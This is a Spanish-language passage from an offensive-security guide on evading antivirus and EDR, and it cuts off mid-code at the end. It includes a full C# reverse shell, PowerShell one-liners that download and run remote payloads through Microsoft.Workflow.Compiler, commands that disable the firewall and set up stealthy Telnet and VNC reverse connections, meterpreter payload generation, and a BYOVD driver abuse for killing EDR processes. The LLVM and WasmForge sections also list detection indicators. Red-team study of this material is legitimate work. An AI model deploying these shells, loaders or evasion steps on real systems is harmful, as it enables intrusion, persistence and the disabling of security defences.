- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator es un framework de ofuscación de código de grano fino para lenguajes compatibles con LLVM que usa ROP (programación orientada al retorno). ROPfuscator ofusca un programa en el nivel de código ensamblador transformando instrucciones normales en cadenas ROP, lo que frustra nuestra concepción natural del flujo de control normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt es un crypter de PE .NET escrito en Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor puede convertir EXE/DLL existentes en shellcode y luego cargarlos

### Enmascaramiento propio por función asistido por el compilador LLVM

En lugar de enmascarar todo un implant solo mientras está inactivo, un backend X86 de LLVM modificado puede mantener funciones seleccionadas enmascaradas con XOR cuando están inactivas. La PoC Function Peekaboo selecciona nombres desmanglados que contienen `REG_`, inyecta stubs de entrada/salida independientes de la posición alrededor del código máquina final y emite un único handler de enmascaramiento compartido en `.text`; las firmas de nivel de código fuente y la convención de llamada de Windows x64 permanecen intactas.<sup>[[38]](#references)[[39]](#references)</sup>

#### Transformación del flujo de control del backend

Esto debe hacerse después de la selección de instrucciones y la optimización, ya que la transformación debe abarcar **cada retorno emitido** y conocer el diseño exacto de x86. Un `MachineFunctionPass` previo a la emisión encuentra la última `MachineInstr::isReturn()`, la elimina para que la ruta final continúe hacia el epílogo añadido y reemplaza los retornos anteriores por `JMP_1 handler`. Conserva cualquier desmontaje de pila/frame generado por el compilador antes de cada retorno; redirige únicamente la propia instrucción de retorno.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` y `emitFunctionBodyEnd()` emiten los stubs por función, mientras que `emitEndOfAsmFile()` emite el handler. Los símbolos compartidos entre etapas de emisión permiten que una rama del prólogo apunte a su epílogo posterior; para un `je` near emitido manualmente, escribe `0F 84` seguido de la expresión MC de cuatro bytes `target - address_after_je`. Las llamadas y los saltos al handler pueden emitirse, en cambio, como objetos `MCInst` (`CALL64pcrel32` y `JMP_1`). Un pass debe devolver `false` para una función no seleccionada si no ha cambiado nada; la PoC devuelve incorrectamente `true` en esa ruta.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadatos e inicialización previa al CRT

La PoC coloca una clave XOR y registros de 16 bytes que contienen un puntero a función reubicado por el loader más una longitud en tiempo de ejecución en `.funcmeta`. Aunque el campo C es un `uint32_t`, el handler accede a un QWORD en el desplazamiento `+8` del registro, consumiendo la longitud y su padding, y avanza los registros de `0x10` en `0x10`. Los nombres de sección PE ocupan solo ocho bytes, por lo que la búsqueda en tiempo de ejecución ve `.funcmet`. Un patcher externo añade un `.stub` ejecutable, guarda el RVA del entry point anterior en el stub y redirige `AddressOfEntryPoint`; el stub PIC obtiene la base de la imagen desde `gs:[0x60]` → `[PEB+0x10]`, recorre las importaciones de PE32+ para resolver un `VirtualProtect` ya importado y se ejecuta antes del CRT.<sup>[[38]](#references)[[39]](#references)</sup>

La inicialización establece un valor centinela en `gs:[0xE8]` y llama a todas las funciones de los metadatos. El prólogo, que siempre permanece legible, registra el inicio de la función en `gs:[0xF0]`, detecta el centinela y omite el cuerpo, que sigue descifrado. El epílogo usa entonces `call handler`; después de que el handler guarde 13 registros (`0x68` bytes), la dirección de retorno en `[rsp+0x68]` corresponde al final de la función transformada, de modo que `end - start` puede escribirse en el registro de metadatos. Una vez enmascarados todos los cuerpos, el stub borra el centinela y salta a `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Durante una llamada normal, el prólogo llama al mismo handler simétrico para decodificar el cuerpo. La ruta final continúa hacia el epílogo añadido, mientras que cada retorno anterior salta directamente al handler compartido. El epílogo normal también usa `jmp handler` en vez de `call`, así que, tras volver a enmascarar, el `ret` del handler consume la dirección de retorno original del caller y conserva el resultado de la función en `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitiva de enmascaramiento e indicadores de análisis

El handler encuentra el registro actual, omite el prólogo visible de longitud fija (en esta compilación, `0x46` bytes), cambia el resto a `PAGE_EXECUTE_READWRITE`, aplica XOR byte a byte con el byte bajo de la clave y, a continuación, lo establece en `PAGE_EXECUTE_READ`. Así, el mismo bucle decodifica al entrar y codifica en cada salida normal.<sup>[[38]](#references)[[39]](#references)</sup>

Entre los indicadores de alta señal de este diseño se incluyen:<sup>[[38]](#references)[[39]](#references)</sup>

- un entry point dentro de un `.stub` ejecutable y una sección `.funcmet` que contiene una clave y punteros reubicados a `.text`;
- análisis del PEB, la tabla de importaciones y la tabla de secciones antes del CRT, seguido de llamadas a través de cada puntero de metadatos;
- prólogos PIC idénticos de `call`/`pop` y muchos puntos de retorno redirigidos a un único handler;
- escrituras en `gs:[0xE8]`, `gs:[0xF0]` y `gs:[0xF8]`, seguidas de transiciones repetidas de `VirtualProtect` y escrituras XOR byte a byte en páginas ejecutables respaldadas por la imagen.

Esto evade los scanners de memoria, pero no ofrece protección criptográfica: el archivo parcheado todavía contiene el cuerpo original en claro, y un debugger puede detenerse en `VirtualProtect` o en el bucle XOR y volcar la función activa. El XOR de un solo byte, los metadatos legibles y el límite fijo `0x46` también hacen que la recuperación offline sea sencilla.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Los slots TEB de la PoC son locales al hilo, pero las páginas de código modificadas son globales al proceso. Por lo tanto, una entrada concurrente o recursiva puede volver a alternar las instrucciones mientras otra invocación las está ejecutando; las excepciones y las salidas no locales también pueden evitar que se vuelvan a enmascarar. Una implementación robusta debe sincronizar las transiciones, restaurar la protección realmente devuelta a través de `lpflOldProtect`, evitar longitudes de stub codificadas de forma fija, auditar las rutas `call` y `jmp` para garantizar la alineación de pila x64 y llamar a `FlushInstructionCache` después de reescribir bytes ejecutables. Microsoft establece explícitamente que el caller es responsable de la coherencia de la caché de instrucciones cuando se modifica código ejecutable.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen y MoTW

Es posible que hayas visto esta pantalla al descargar ejecutables de Internet y ejecutarlos.

Microsoft Defender SmartScreen es un mecanismo de seguridad diseñado para proteger al usuario final frente a la ejecución de aplicaciones potencialmente maliciosas.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funciona principalmente mediante un enfoque basado en la reputación; por eso, las aplicaciones descargadas con poca frecuencia activan SmartScreen, que alerta al usuario final e impide que ejecute el archivo (aunque aún puede ejecutarlo haciendo clic en More Info -> Run anyway).

**MoTW** (Mark of The Web) es un [flujo de datos alternativo de NTFS](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) llamado Zone.Identifier, que se crea automáticamente al descargar archivos de Internet, junto con la URL desde la que se descargaron.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Comprobación del ADS Zone.Identifier de un archivo descargado de Internet.</p></figcaption></figure>

> [!TIP]
> Es importante tener en cuenta que los ejecutables firmados con un certificado de firma **de confianza** **no activarán SmartScreen**.

Una forma muy eficaz de evitar que tus payloads reciban Mark of The Web es empaquetarlos en algún tipo de contenedor, como una ISO. Esto se debe a que Mark-of-the-Web (MOTW) **no puede** aplicarse a volúmenes **que no sean NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) es una herramienta que empaqueta payloads en contenedores de salida para evadir Mark-of-the-Web.

Ejemplo de uso:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Aquí tienes una demostración para evadir SmartScreen empaquetando payloads dentro de archivos ISO con [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) es un potente mecanismo de registro de Windows que permite a las aplicaciones y los componentes del sistema **registrar eventos**. Sin embargo, los productos de seguridad también pueden usarlo para supervisar y detectar actividades maliciosas.

De forma similar a como se deshabilita (evade) AMSI, también es posible hacer que la función **`EtwEventWrite`** del proceso en espacio de usuario devuelva el control inmediatamente sin registrar ningún evento. Esto se consigue parcheando la función en memoria para que devuelva el control inmediatamente, deshabilitando así el registro de ETW para ese proceso.

Puedes encontrar más información en **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) y [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## Reflexión de ensamblados C#

Desde hace bastante tiempo se sabe que es posible cargar binarios de C# en memoria, y sigue siendo una forma excelente de ejecutar tus herramientas de post-exploitation sin que el AV te detecte.

Como el payload se cargará directamente en memoria sin tocar el disco, solo tendremos que preocuparnos de parchear AMSI para todo el proceso.

La mayoría de los frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) ya permiten ejecutar ensamblados C# directamente en memoria, pero hay distintas formas de hacerlo:

- **Fork\&Run**

Consiste en **iniciar un nuevo proceso sacrificial**, inyectar tu código malicioso de post-exploitation en ese proceso, ejecutar el código malicioso y, al terminar, cerrar el nuevo proceso. Esto tiene ventajas e inconvenientes. La ventaja del método fork and run es que la ejecución ocurre **fuera** del proceso de nuestro implante Beacon. Esto significa que, si algo sale mal durante la acción de post-exploitation o nos detectan, hay una **probabilidad mucho mayor** de que nuestro **implante sobreviva**. El inconveniente es que tienes una **mayor probabilidad** de que te detecten mediante **detecciones de comportamiento**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Consiste en inyectar el código malicioso de post-exploitation **en su propio proceso**. Así, puedes evitar crear un proceso nuevo y que el AV lo analice, pero el inconveniente es que, si algo sale mal al ejecutar tu payload, hay una **probabilidad mucho mayor** de **perder tu beacon**, ya que podría bloquearse.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Si quieres leer más sobre la carga de ensamblados C#, consulta este artículo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) y su BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

También puedes cargar ensamblados C# **desde PowerShell**; consulta [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) y [el video de S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Reempaquetado de herramientas .NET como WebAssembly con NativeAOT (WasmForge)

Las técnicas habituales de `execute-assembly` conservan MSIL reconocible y, tarde o temprano, inicializan un CLR. **WasmForge** cambia el entorno de ejecución: migra un proyecto C# al destino experimental NativeAOT-LLVM WASI, lo compila anticipadamente a WebAssembly e incrusta ese módulo en un host PE de Windows basado en Wazero. El proceso resultante no necesita el CLR, el JIT ni el host `dotnet` del sistema objetivo, por lo que las reglas que se basan únicamente en nombres de ensamblados administrados, la carga de CLR, AMSI o .NET ETW pierden visibilidad directa. Esta es una técnica de evasión y empaquetado, no una evasión de los límites de privilegios: el proceso huésped conserva los permisos y el comportamiento observable del SO de la herramienta original.<sup>[[44]](#references)[[45]](#references)</sup>

### Compilación de un proyecto C#

La ruta de compilación recomendada es el entorno Docker del proyecto, ya que incluye el SDK de .NET 10, la carga de trabajo NativeAOT-LLVM, WASI SDK 24.0, el enlazador y las dependencias de firma. Se detecta automáticamente el archivo `.csproj`; la compilación de un solo paso realiza la migración, aplica parches de compatibilidad, compila el WASM, forja el PE y lo firma.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Para solucionar problemas o revisar el código generado, divide el proceso en `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` y, por último, `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. La imagen de compilación también usa un wrapper `wasm-component-ld` para evitar la codificación de componentes de WASI Preview 2 y generar el módulo simple que espera el runtime integrado.<sup>[[44]](#references)[[45]](#references)</sup>

### Puente entre wasm32 C# y x64 Win32

Esto no es una recompilación transparente. NativeAOT-WASI carece de algunas funciones BCL orientadas a Windows o las modifica, y un guest wasm32 normalmente asigna espacios de puntero de cuatro bytes, mientras que las API x64 pueden devolver punteros de ocho bytes. WasmForge aborda ambos problemas con las siguientes capas generadas:<sup>[[44]](#references)</sup>

1. Un parcheador de código fuente corrige diferencias semánticas específicas de AOT y redirige llamadas no compatibles de registro, pipes, WMI, identidad, servicios de directorio, versión de archivo, LSA y similares a helpers `Wf*`.
2. Un escáner P/Invoke genera asignaciones `DirectPInvoke` de NativeAOT para que las llamadas `[DllImport]` se vinculen a símbolos C de puente enlazados, en lugar de cargar dinámicamente la DLL declarada dentro del guest.
3. Los punteros vinculados al host usan `ulong` en C# y `uint64_t` en C. Un dispatcher genérico reenvía la llamada al handler Win32 del host; un `out8_mask` marca los espacios de salida genuinos de ocho bytes cuyos bits superiores deben conservarse. Para los espacios de salida sin marcar con formato wasm32 se usa protección de captura/restauración para evitar que una escritura x64 corrompa los cuatro bytes adyacentes.
4. Los puentes de host dedicados gestionan operaciones que no encajan en el despacho genérico de llamadas al sistema, como el acceso a la caché de tickets de LSA, operaciones Kerberos/BCrypt con resultados estructurados, tráfico TCP de KDC y consultas LDAP.

Por ejemplo, un wrapper para `version.dll!VerQueryValueW` pasa cuatro direcciones del host y establece los bits 2 y 3 (`0xC`), porque el puntero al valor y la longitud son espacios de salida de ocho bytes. El propio wrapper sigue siendo genérico y delega el nombre de la DLL, el nombre de la exportación, los argumentos y la máscara a `wf_call_v2`; el host realiza la traducción de punteros e invoca la API nativa.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Limitaciones y puntos de detección

El código con uso intensivo de reflection, la carga dinámica de assemblies, las callbacks nativas arbitrarias y las estructuras x64 complejas devueltas a la memoria WASM aún pueden requerir parches específicos para cada herramienta o fallar por completo. Los sockets genéricos de WASI Preview 2 también pueden llegar a stubs que no hacen nada, por lo que las herramientas compatibles usan shims del host específicos del protocolo. Valida cada comando frente a una compilación nativa en lugar de dar por sentada la paridad de funciones.<sup>[[44]](#references)[[45]](#references)</sup>

La técnica desplaza la telemetría en lugar de hacer invisible el payload. La detección puede centrarse en un PE que contenga o materialice un módulo WASM, el comportamiento de un runtime similar a Wazero, la asignación y copia inusuales de memoria entre host y guest, el despacho directo genérico de Win32, anomalías de firma y de recursos PE, además de las llamadas a la API y el tráfico de red resultantes. Por lo tanto, la ausencia de eventos de carga de CLR, AMSI o ETW de .NET no debe considerarse evidencia de que un proceso sea benigno.<sup>[[44]](#references)</sup>

## Uso de otros lenguajes de programación

Como se propone en [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), es posible ejecutar código malicioso usando otros lenguajes al dar a la máquina comprometida acceso **al entorno del intérprete instalado en el recurso compartido SMB controlado por el atacante**.

Al permitir el acceso a los binarios del intérprete y al entorno del recurso compartido SMB, puedes **ejecutar código arbitrario en estos lenguajes en la memoria** de la máquina comprometida.

El repositorio indica: Defender sigue analizando los scripts, pero al utilizar Go, Java, PHP, etc., tenemos **más flexibilidad para evadir firmas estáticas**. Las pruebas con scripts de reverse shell aleatorios y ofuscados en estos lenguajes han sido exitosas.

## Rehosting de WebAssembly para evadir el análisis estático

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping manipula el token de acceso de un producto de seguridad como un EDR o un antivirus. Reducir los privilegios del token puede dejar el proceso en ejecución e impedir que realice acciones privilegiadas de inspección o corrección.

Para evitarlo, Windows podría **impedir que los procesos externos** obtengan handles a los tokens de los procesos de seguridad.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Uso de software confiable

### Chrome Remote Desktop

Como se describe en [**esta publicación de blog**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), es fácil implementar Chrome Remote Desktop en el PC de una víctima y luego usarlo para tomar el control y mantener la persistencia:<sup>[[35]](#references)</sup>
1. Descárgalo desde https://remotedesktop.google.com/, haz clic en "Set up via SSH" y luego en el archivo MSI de Windows para descargarlo.
2. Ejecuta el instalador en modo silencioso en la víctima (se requieren privilegios de administrador): `msiexec /i chromeremotedesktophost.msi /qn`
3. Vuelve a la página de Chrome Remote Desktop y haz clic en siguiente. El asistente te pedirá autorización; haz clic en el botón Authorize para continuar.
4. Ejecuta el comando proporcionado con los ajustes necesarios: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (el parámetro `--pin` establece el PIN sin usar la GUI).
 

## Evasión avanzada

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

La evasión es un tema muy complicado. A veces hay que tener en cuenta muchas fuentes diferentes de telemetría en un solo sistema, así que es prácticamente imposible permanecer completamente indetectable en entornos maduros.

Cada entorno al que te enfrentes tendrá sus propias fortalezas y debilidades.

Te recomiendo encarecidamente que veas esta charla de [@ATTL4S](https://twitter.com/DaniLJ94) para obtener una base sobre técnicas de evasión avanzada.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Esta es otra gran charla de [@mariuszbit](https://twitter.com/mariuszbit) sobre la evasión en profundidad.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Técnicas antiguas**

### **Comprobar qué partes considera maliciosas Defender**

Puedes usar [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), que **eliminará partes del binario** hasta **averiguar qué parte considera maliciosa Defender** y te la separará.\
Otra herramienta que hace **lo mismo es** [**avred**](https://github.com/dobin/avred), que ofrece el servicio en una web pública en [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Servidor Telnet**

Hasta Windows 10, todos los Windows incluían un **servidor Telnet** que podías instalar (como administrador) de esta manera:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Haz que se **inicie** al arrancar el sistema y **ejecútalo** ahora:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Cambiar el puerto de telnet** (sigiloso) y deshabilitar el firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Descárgalo desde: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (necesitas las descargas de binarios, no el instalador)

**EN EL HOST**: Ejecuta _**winvnc.exe**_ y configura el servidor:

- Activa la opción _Disable TrayIcon_
- Establece una contraseña en _VNC Password_
- Establece una contraseña en _View-Only Password_

Luego, mueve el binario _**winvnc.exe**_ y el archivo _**UltraVNC.ini**_ recién creado al **equipo víctima**

#### **Conexión inversa**

El **atacante** debe **ejecutar en su** **host** el binario `vncviewer.exe -listen 5900` para **estar preparado** para recibir una **conexión VNC** inversa. Luego, en el **equipo víctima**: inicia el daemon winvnc con `winvnc.exe -run` y ejecuta `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ADVERTENCIA:** Para mantener el sigilo, no hagas algunas cosas

- No inicies `winvnc` si ya está en ejecución o activarás una [ventana emergente](https://i.imgur.com/1SROTTl.png). Comprueba si está en ejecución con `tasklist | findstr winvnc`
- No inicies `winvnc` sin que `UltraVNC.ini` esté en el mismo directorio o se abrirá [la ventana de configuración](https://i.imgur.com/rfMQWcf.png)
- No ejecutes `winvnc -h` para obtener ayuda o activarás una [ventana emergente](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Descárgalo desde: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Dentro de GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Ahora **inicia el listener** con `msfconsole -r file.rc` y **ejecuta** el **payload xml** con:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**El Defender actual terminará el proceso muy rápido.**

### Compilar nuestro propio reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primer reverse shell en C#

Compílalo con:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Úsalo con:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# mediante el compilador

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Descarga y ejecución automáticas:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista de ofuscadores de C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Uso de Python para crear ejemplos de inyectores:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Otras herramientas

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Más

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Desactivar AV/EDR desde el espacio del kernel

Storm-2603 aprovechó una pequeña utilidad de consola conocida como **Antivirus Terminator** para desactivar las protecciones de los endpoints antes de desplegar ransomware. La herramienta incluye su **propio controlador vulnerable pero *firmado*** y abusa de él para ejecutar operaciones privilegiadas en el kernel que ni siquiera los servicios de AV Protected-Process-Light (PPL) pueden bloquear.<sup>[[12]](#references)</sup>

Conclusiones clave
1. **Controlador firmado**: El archivo que se escribe en el disco es `ServiceMouse.sys`, pero el binario es el controlador legítimamente firmado `AToolsKrnl64.sys` del «System In-Depth Analysis Toolkit» de Antiy Labs. Como el controlador tiene una firma válida de Microsoft, se carga incluso cuando Driver-Signature-Enforcement (DSE) está habilitado.
2. **Instalación del servicio**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   La primera línea registra el driver como **servicio del kernel** y la segunda lo inicia para que `\\.\ServiceMouse` esté accesible desde userland.
3. **IOCTLs expuestos por el driver**
   | Código IOCTL | Capacidad                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Terminar un proceso arbitrario por PID (se usa para finalizar servicios de Defender/EDR) |
   | `0x990000D0` | Eliminar un archivo arbitrario del disco |
   | `0x990001D0` | Descargar el driver y eliminar el servicio |

   Prueba de concepto mínima en C:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
